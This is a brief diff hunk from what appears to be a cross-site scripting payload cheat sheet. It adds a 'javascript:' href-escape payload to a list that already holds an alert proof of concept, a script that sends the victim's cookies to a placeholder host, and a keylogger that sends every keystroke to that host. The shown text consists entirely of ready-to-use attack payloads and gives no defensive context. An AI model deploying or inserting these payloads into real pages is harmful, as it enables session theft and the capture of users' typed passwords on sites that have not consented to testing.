@@ -4,6 +4,7 @@
 <script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
 POC: <script>alert('1');</script>
 Key Logger : <script>document.onkeypress = function(e) { fetch('https://{URL_OR_IP}/log?key=' + btoa(e.key) );}</script>
+Href escape: javascript:console.log('javascript');alert('javascript')
 ```
 
 
